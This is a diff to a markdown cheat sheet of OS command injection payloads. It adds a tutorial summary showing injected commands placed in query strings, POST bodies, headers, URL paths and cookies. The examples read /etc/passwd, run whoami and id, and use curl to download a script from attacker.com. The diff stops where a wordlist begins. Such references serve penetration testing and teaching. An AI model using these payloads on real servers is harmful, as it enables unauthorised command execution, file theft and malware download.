@@ -1,5 +1,8 @@
+
+
 # OS Command Injection Payloads
 
+  - [Summary](#summary)
   - [Wordlist](#wordlist)
   - [Simple Case](#simple-case)
   - [Blind Injection](#blind-injection)
@@ -7,6 +10,83 @@
   - [Out of Band](#out-of-band)
   - [ChatGPT Payload](#chatgpt-payload)
 ___
+# Summary
+
+To exploit an OS command injection vulnerability, an attacker must find a place where the application accepts user input and then inject a malicious payload that executes arbitrary commands on the server. This usually involves crafting an HTTP request where the payload is placed in an input field that the server processes with a system command.
+
+Here are some examples of where to put a command injection payload in HTTP requests:
+
+### 1. In Query Parameters
+
+When an application takes a query parameter as input and uses it in a command execution on the server, you can place the payload in the parameter value.
+
+**Example HTTP Request:**
+```
+GET /ping?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1
+Host: vulnerable-website.com
+```
+In this case, the server might execute a command like `ping 127.0.0.1` based on the input. The payload (`;cat /etc/passwd`) tries to execute an additional command to read the contents of the `/etc/passwd` file.
+
+### 2. In POST Data
+
+If a web application processes POST data to execute commands, you can inject the payload directly into the form data.
+
+**Example HTTP Request:**
+```
+POST /submit HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+
+username=admin&command=whoami;id
+```
+In this example, the `command` parameter contains a payload (`whoami;id`) that tries to execute `whoami` followed by `id`. If the server executes this input as part of a command, the payload can run.
+
+### 3. In HTTP Headers
+
+Attackers may inject command injection payloads into HTTP headers if the application processes header values and uses them in commands.
+
+**Example HTTP Request:**
+```
+GET / HTTP/1.1
+Host: vulnerable-website.com
+User-Agent: curl; ls -la
+```
+If the server uses the `User-Agent` header in a command execution, the payload (`; ls -la`) may run on the server.
+
+### 4. In URL Path
+
+Command injection payloads can also be placed in the URL path if the web application uses parts of the path to execute commands.
+
+**Example HTTP Request:**
+```
+GET /execute/ls%20-la;cat%20/etc/passwd HTTP/1.1
+Host: vulnerable-website.com
+```
+Here, the URL path `/execute/ls -la;cat /etc/passwd` is designed to manipulate the command execution on the server.
+
+### 5. In Cookie Header
+
+If the web application reads cookies and uses them in a system command, the payload can be placed inside the cookie value.
+
+**Example HTTP Request:**
+```
+GET / HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=abc123; curl -o /tmp/malicious.sh http://attacker.com/malicious.sh
+```
+The payload attempts to download a malicious script if the server processes the cookie value in a system command.
+
+### Crafting the Payload
+
+Common payloads for command injection include using separators like `;`, `&&`, `|`, or `||` to chain commands. Examples:
+- `; cat /etc/passwd`
+- `&& whoami`
+- `| ls -la`
+- `|| echo vulnerable`
+
+By injecting these payloads in the right places, attackers can exploit command injection vulnerabilities to execute arbitrary commands on the server. Proper input validation, sanitization, and secure coding practices are crucial to mitigate these risks.
+
 ## Wordlist
 ```sh
 ;whoami;
